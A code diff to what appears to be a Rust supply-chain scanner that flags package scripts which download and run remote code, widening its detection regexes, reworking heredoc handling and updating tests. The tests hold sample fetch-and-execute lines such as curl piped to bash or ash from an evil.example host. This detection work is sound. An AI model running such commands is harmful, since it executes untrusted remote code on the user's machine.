@@ -9,13 +9,13 @@
 //! Instead this analyzer detects the fetch-and-execute, extracts the URL(s),
 //! and emits a loud finding. Downstream, such a package is marked as an
 //! **opaque boundary**: the SBOM cannot account for what runs beyond it, by
-//! design -- the correct message to the user is "this runs code from <url>,
+//! design -- the correct message to the user is "this runs code from `<url>`,
 //! you probably don't want that", not a fabricated "complete" SBOM.
 
 use super::SecurityAnalyzer;
 use crate::error::Result;
 use crate::resolve::{resolve_variables, statement_head};
-use crate::rules::informational_lines_with;
+use crate::rules::{inert_kinds_with, MsgContext};
 use crate::textutil::{
     deobfuscate, logical_lines, normalize_shell_quoting, split_statements, split_words,
     BraceScanner, INTERPRETERS, SHELLS, SHELL_LAUNCHER, SHELL_PATH,
@@ -24,7 +24,7 @@ use crate::types::{AnalysisContext, Category, Finding, Location, Severity};
 use async_trait::async_trait;
 use lazy_static::lazy_static;
 use regex::Regex;
-use std::collections::HashSet;
+use std::collections::{HashMap, HashSet};
 
 lazy_static! {
     /// A line that downloads and immediately executes remote content.
@@ -33,10 +33,10 @@ lazy_static! {
     /// constants so every detector recognizes the same set -- notably `dash`,
     /// which the previous inline `(ba|z|k|c|d|tc|fi)?sh` could never match
     /// (`d?sh` is `dsh`/`sh`, not `dash`), letting `curl evil | dash` evade this
-    /// analyzer entirely (defect #6).
+    /// analyzer entirely.
     static ref FETCH_EXEC: Regex = Regex::new(&format!(
         // `(?i)` so case variation (`CURL`, `BASH`, `Wget`) cannot evade the
-        // fetch-and-execute sink (audit HI-6). Every token here is a command or
+        // fetch-and-execute sink. Every token here is a command or
         // shell/interpreter name -- none is case-canonical -- so a blanket
         // case-insensitive match is correct and introduces no false positives.
         r#"(?ix)
@@ -46,11 +46,14 @@ lazy_static! {
         | {SHELL_LAUNCHER}{SHELL_PATH}\b{INTERPRETERS}\b\s+<\(\s*(curl|wget|fetch)\b           # [launcher][path] python <(curl ...)
         | {SHELL_LAUNCHER}{SHELL_PATH}\b{INTERPRETERS}\b[^\n|]*?(?:\$\(\s*(curl|wget|aria2c|fetch|http)|<<<[^\n]*\$\(\s*(curl|wget|fetch))  # interp [flags] "$(curl)" / <<< "$(curl)" (php -r, perl -ne, python -B -c, ruby -r..-e)
         | {SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b[^\n|]*?(?:\$\(\s*(curl|wget|aria2c|fetch)\b|<<<[^\n]*\$\(\s*(curl|wget|fetch))  # shell [flags] "$(curl)" / <<< "$(curl)" (sh -c "$(curl ...)")
+        | (curl|wget|aria2c|fetch)\b(?:[^\n]*[^|\n])?\|\s*{PIPE_EXTRA}  # download | . /dev/stdin, xargs sh, tee >(sh)
+        | {SHELL_LAUNCHER}{SHELL_PATH}\b(?:{SHELLS}|{INTERPRETERS})\b[^|;&\n]*?<\s*<\(\s*(curl|wget|aria2c|fetch)\b  # sh < <(curl ...)
+        | (?:\.|source)\s+/dev/stdin\b[^|;&\n]*?<\s*<\(\s*(curl|wget|aria2c|fetch)\b  # . /dev/stdin < <(curl ...)
         | source\s+<\(\s*(curl|wget|fetch)\b                         # source <(curl ...)
         | \beval\s+["']?\$\(\s*(curl|wget|fetch)\b                   # eval "$(curl ...)"
         | \.\s+<\(\s*(curl|wget|fetch)\b                             # . <(curl ...)
         "#
-    )).unwrap();
+    , PIPE_EXTRA = crate::textutil::pipe_sink_extra())).unwrap();
     /// Extract http(s) URLs (stop at shell/quote boundaries).
     static ref URL: Regex = Regex::new(r#"https?://[^\s"'`|)><(]+"#).unwrap();
 }
@@ -200,9 +203,6 @@ lazy_static! {
     static ref FETCH_SUBST: Regex = Regex::new(
         r#"(?i)(?:\$\(|`)\s*(?:(?:/\S+/)?(?:curl|wget|aria2c|fetch))\b"#
     ).unwrap();
-    /// `<<EOF` / `<<-'EOF'` heredoc opener; captures the delimiter.
-    static ref HEREDOC_OPEN: Regex =
-        Regex::new(r#"(?:^|[^<])<<-?\s*['"\\]?([A-Za-z_][A-Za-z0-9_]*)['"]?"#).unwrap();
     /// A pipe into a shell/interpreter.
     static ref SHELL_PIPE_SINK: Regex = Regex::new(&format!(
         r"(?i)\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b(?:{SHELLS}|{INTERPRETERS})\b"
@@ -557,7 +557,7 @@ impl RemoteExecAnalyzer {
         // package that merely DOCUMENTS a `curl ... | sh` example does not raise
         // EXEC-REMOTE.
         let line_strs: Vec<&str> = lines.iter().map(|(_, s)| s.as_str()).collect();
-        let informational = informational_lines_with(&line_strs, shadowed);
+        let informational = inert_kinds_with(&line_strs, shadowed, MsgContext::for_path(file));
         // Variable-resolved variant (static taint pass): `c=curl; $c url | sh`,
         // top-level `_c=curl` used in a function, `${IFS}` separators and short
         // inline-encoded payloads. Aligned to logical lines by start line.
@@ -568,13 +568,25 @@ impl RemoteExecAnalyzer {
         let mut top = Flow::default();
         let mut local: Option<Flow> = None;
         let mut scanner = BraceScanner::default();
-        // Open heredoc fed to a shell: (delimiter).
-        let mut exec_heredoc: Option<String> = None;
+        // Heredocs located by the shared lexer (quote/comment aware, full
+        // delimiter word); `exec_end` is the terminator index of the open one
+        // that is fed to a shell/interpreter.
+        let heredocs: HashMap<usize, crate::textutil::Heredoc> =
+            crate::textutil::classify_lines(&line_strs)
+                .heredocs
+                .into_iter()
+                .rev()
+                .map(|h| (h.open_line, h))
+                .collect();
+        let mut exec_end: Option<usize> = None;
 
         for (idx_l, (phys_line, line)) in lines.iter().enumerate() {
             let line = line.as_str();
             let trimmed = line.trim_start();
-            let skip = trimmed.starts_with('#') || informational[idx_l];
+            // Every finding here is High or Critical, so only a pure one-line print
+            // is skipped; a printed heredoc body is still scanned.
+            let skip = trimmed.starts_with('#')
+                || informational[idx_l].suppresses(crate::types::Severity::High);
             let idx = phys_line - 1;
             let resolved: Option<&str> = resolved_phys
                 .get(idx)
@@ -644,9 +656,9 @@ impl RemoteExecAnalyzer {
                 }
 
                 // ---- Heredoc fed to a shell/interpreter: `$(curl …)` in the body.
-                if let Some(delim) = &exec_heredoc {
-                    if line.trim() == delim.as_str() {
-                        exec_heredoc = None;
+                if let Some(end) = exec_end {
+                    if idx_l >= end {
+                        exec_end = None;
                     } else if let Some(sl) = [Some(line), decoded.as_deref(), resolved]
                         .into_iter()
                         .flatten()
@@ -674,14 +686,14 @@ impl RemoteExecAnalyzer {
                             "heredoc-fetch",
                         ));
                     }
-                } else if let Some(c) = HEREDOC_OPEN.captures(line) {
+                } else if let Some(h) = heredocs.get(&idx_l) {
                     let src = resolved.or(decoded.as_deref()).unwrap_or(line);
                     let words = split_words(statement_head(src).0);
                     let ci = command_index(&words);
                     let cmd = words.get(ci).map(|w| base_of(w)).unwrap_or_default();
                     let to_shell_pipe = SHELL_PIPE_SINK.is_match(src);
                     if SHELL_OR_INTERP.is_match(&cmd) || cmd == "eval" || to_shell_pipe {
-                        exec_heredoc = Some(c[1].to_string());
+                        exec_end = Some(h.end);
                     }
                 }
 
@@ -823,7 +835,7 @@ impl Default for RemoteExecAnalyzer {
 impl SecurityAnalyzer for RemoteExecAnalyzer {
     async fn analyze(&self, context: &AnalysisContext) -> Result<Vec<Finding>> {
         let shadow = context.shadowed_printers();
-        let shadowed = shadow.names();
+        let shadowed = context.shadowed_names();
         let mut findings: Vec<Finding> = Vec::new();
         let mut files: Vec<(&str, &std::path::Path, bool)> = vec![(
             context.pkgbuild.raw_content.as_str(),
@@ -835,10 +847,10 @@ impl SecurityAnalyzer for RemoteExecAnalyzer {
         }
         for (text, path, in_install) in files {
             let mut seen: HashSet<(String, Option<usize>)> = HashSet::new();
-            let mut all = self.scan_with(text, path, in_install, &shadowed);
+            let mut all = self.scan_with(text, path, in_install, shadowed);
             // Calls to a redefined printer, replaced by what they execute.
             if let Some(inlined) = shadow.inline_calls(text) {
-                all.extend(self.scan_with(&inlined, path, in_install, &shadowed));
+                all.extend(self.scan_with(&inlined, path, in_install, shadowed));
             }
             for f in all {
                 if seen.insert((f.id.clone(), f.location.line)) {
@@ -886,7 +898,7 @@ mod tests {
 
     #[test]
     fn detects_continuation_split_fetch_exec() {
-        // CR-3: the pipe-to-shell is on a backslash-continuation line.
+        // The pipe-to-shell is on a backslash-continuation line.
         let a = RemoteExecAnalyzer::new();
         let f = a.scan(
             "build() {\n  curl -fsSL https://evil.example/x \\\n    | bash\n}",
@@ -916,7 +928,7 @@ mod tests {
 
     #[test]
     fn detects_curl_pipe_ash() {
-        // Task 4050 F2: ash is a SHELLS member now — `curl ... | ash` must fire.
+        // `ash` is a SHELLS member now — `curl ... | ash` must fire.
         let a = RemoteExecAnalyzer::new();
         let f = a.scan(
             "curl -fsSL https://evil.example/x.sh | ash",
@@ -931,7 +943,7 @@ mod tests {
 
     #[test]
     fn case_variation_does_not_evade_fetch_exec() {
-        // Audit HI-6: the FETCH_EXEC sink is `(?i)` so upper/mixed-case commands
+        // The FETCH_EXEC sink is `(?i)` so upper/mixed-case commands
         // cannot evade it. Each of these is the same fetch-and-run, re-cased.
         let a = RemoteExecAnalyzer::new();
         for payload in [
@@ -950,7 +962,7 @@ mod tests {
 
     #[test]
     fn lowercase_r_interpreter_does_not_false_positive() {
-        // Audit HI-6 guardrail: making the sink `(?i)` must NOT let the single-
+        // Making the sink `(?i)` must NOT let the single-
         // letter R-language interpreter match a lower-case `r` (an extremely
         // common token) -- `R`/`Rscript` are pinned case-exact via `(?-i:…)` in
         // the INTERPRETERS constant. These benign `r` uses must NOT fire.
@@ -980,7 +992,7 @@ mod tests {
 
     #[test]
     fn detects_launcher_path_and_interpreter_fetch_exec() {
-        // Task 4050 exhaustive scope: path-prefixed shells (`/bin/sh`),
+        // Path-prefixed shells (`/bin/sh`),
         // path+launcher (`/usr/bin/env sh`), path interpreters
         // (`/usr/bin/python3`), and the expanded interpreter set must all trip
         // EXEC-REMOTE.
@@ -1007,7 +1019,7 @@ mod tests {
 
     #[test]
     fn detects_interpreter_sink_forms() {
-        // Task 4050 round 3 / Class 1: the interpreter sink must mirror the shell
+        // The interpreter sink must mirror the shell
         // forms — process-sub `<(curl)` and `-c|-e "$(curl)"` — not just the pipe.
         let a = RemoteExecAnalyzer::new();
         for cmd in [
@@ -1029,7 +1041,7 @@ mod tests {
 
     #[test]
     fn detects_expanded_interpreter_and_shell_list() {
-        // Task 4050 round 3 / Class 2 + 3: one per novel interpreter/shell family.
+        // One per novel interpreter/shell family.
         let a = RemoteExecAnalyzer::new();
         for cmd in [
             "curl -s https://evil.example/x | expect",
@@ -1056,7 +1068,7 @@ mod tests {
 
     #[test]
     fn detects_generalized_interpreter_eval_forms() {
-        // Task 4050 round 4: the interpreter eval sink must not enumerate exact
+        // The interpreter eval sink must not enumerate exact
         // flags — any flags between the interpreter and a `$(curl)` (or a `<<<
         // "$(curl)"` here-string) must fire (php -r, perl -ne, ruby -r..-e,
         // python -B -c, python <<<).
@@ -1130,10 +1142,10 @@ mod tests {
     }
 
     #[test]
-    fn documented_fetch_exec_in_printed_heredoc_not_flagged() {
-        // Task 4050a: a `curl ... | sh` that only appears inside a printed
-        // (non-redirected) heredoc is documentation, not execution — must not
-        // raise EXEC-REMOTE.
+    fn fetch_exec_in_printed_heredoc_is_still_reported() {
+        // A printed heredoc can be faked by desyncing the lexer, so a Critical
+        // finding is never suppressed by it: a documented `curl | sh` is
+        // reported (fail toward scanning).
         let a = RemoteExecAnalyzer::new();
         let f = a.scan(
             "post_install() {\n  cat <<EOF\n  To set up, run: curl -fsSL https://x.io/i.sh | sh\nEOF\n}",
@@ -1141,8 +1153,8 @@ mod tests {
             true,
         );
         assert!(
-            f.is_empty(),
-            "documented curl|sh in a printed heredoc must not fire EXEC-REMOTE: {f:?}"
+            !f.is_empty(),
+            "curl|sh in a printed heredoc must still fire EXEC-REMOTE: {f:?}"
         );
     }
 
